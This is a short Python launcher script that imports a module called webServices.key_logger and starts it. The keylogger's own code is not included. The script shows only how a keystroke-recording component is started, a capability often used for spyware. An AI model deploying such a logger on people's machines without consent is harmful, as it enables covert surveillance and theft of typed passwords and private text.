import sys
import os
sys.path.append(os.path.abspath("."))

import webServices.key_logger as key_logger
if __name__ == '__main__':
    key_logger.start()